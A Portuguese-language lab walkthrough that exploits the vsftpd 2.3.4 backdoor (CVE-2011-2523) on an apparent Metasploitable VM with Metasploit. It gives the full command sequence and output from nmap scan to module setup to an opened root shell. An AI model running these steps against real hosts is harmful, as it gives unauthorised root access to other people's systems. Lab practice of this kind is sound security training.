# Exemplo de fluxo com Metasploit-framework
## Exploração da vunrabilidade CVE‑2011‑2523
**Scanning do alvo**

```
$ nmap -sV 192.168.1.33

Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-20 21:37 -03
Nmap scan report for 192.168.1.33
Host is up (0.00021s latency).
Not shown: 977 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
...
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 08:00:27:C7:CF:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.40 seconds
```
**Buscando exploit de vunerabilidade para vsftpd 2.3.4**

```
$ searchsploit vsftpd 2.3.4
---------------------------------------------------------------- ---------------------------------
 Exploit Title                                                  |  Path
---------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                       | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)          | unix/remote/17491.rb
---------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
**Iniciando o console do Metasploit**

`$ msfconsole`

**Pesquisa do exploit**

```
msf6 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor 
```
**Selecionando o exploit**

```
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor 
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
```
**Obtendo informações do exploit**

```
sf6 exploit(unix/ftp/vsftpd_234_backdoor) > show info

       Name: VSFTPD v2.3.4 Backdoor Command Execution
     Module: exploit/unix/ftp/vsftpd_234_backdoor
   Platform: Unix
       Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2011-07-03

Provided by:
  hdm <x@hdm.io>
  MC <mc@metasploit.com>

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic

Check supported:
  No

Basic options:
  Name    Current Setting  Required  Description
  ----    ---------------  --------  -----------
  RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/us
                                     ing-metasploit/basics/using-metasploit.html
  RPORT   21               yes       The target port (TCP)

Payload information:
  Space: 2000
  Avoid: 0 characters

Description:
  This module exploits a malicious backdoor that was added to the       VSFTPD download
  archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between
  June 30th 2011 and July 1st 2011 according to the most recent information
  available. This backdoor was removed on July 3rd 2011.

References:
  OSVDB (73573)
  http://pastebin.com/AetT9sS5
  http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html

View the full module info with the info -d command.
```
**Verificando as opções**

```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/u
                                      sing-metasploit/basics/using-metasploit.html
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.
```
**Configurando as opções**

```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.1.33
RHOSTS => 192.168.1.33
```
**Verificando payload**
```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show payloads

Compatible Payloads
===================

   #  Name                       Disclosure Date  Rank    Check  Description
   -  ----                       ---------------  ----    -----  -----------
   0  payload/cmd/unix/interact  .                normal  No     Unix Command, Interact with Established Connection
```
Como só existe um payload, não há necessidade de selecioná-lo

**Verificando targets**

```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Automatic
```
Target automático, não há necessidade de selecionar

**Verificando as opções uma últimas vez**

```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][.
                                       ..]. Supported proxies: sapni, socks4, socks5, socks5h, h
                                       ttp
   RHOSTS   192.168.1.33     yes       The target host(s), see https://docs.metasploit.com/docs/
                                       using-metasploit/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic

View the full module info with the info, or info -d command.
```
Tudo pronto para começar o exploit

**Executando o exploit**

```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] 192.168.1.33:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.1.33:21 - USER: 331 Please specify the password.
[+] 192.168.1.33:21 - Backdoor service has been spawned, handling...
[+] 192.168.1.33:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.1.10:39041 -> 192.168.1.33:6200) at 2025-08-20 22:07:39 -0300
```
Com a shell aberta, basta executar os comando no alvo.
```
whoami
root
```
Como podemos ver, estamos *logado* na máquina alvo como **root**, com todos os privelégios.

```
pwd
/
```
```
ls 
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
```
Para sair da máquina alvo e retornar ao prompt do metasploit.

```
exit
[*] 192.168.1.33 - Command shell session 1 closed.
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
```
**Saindo do Metasploit**

```msf6 exploit(unix/ftp/vsftpd_234_backdoor) > quit

┌──(OpsShadow㉿Shadow)-[~]
└─$
```

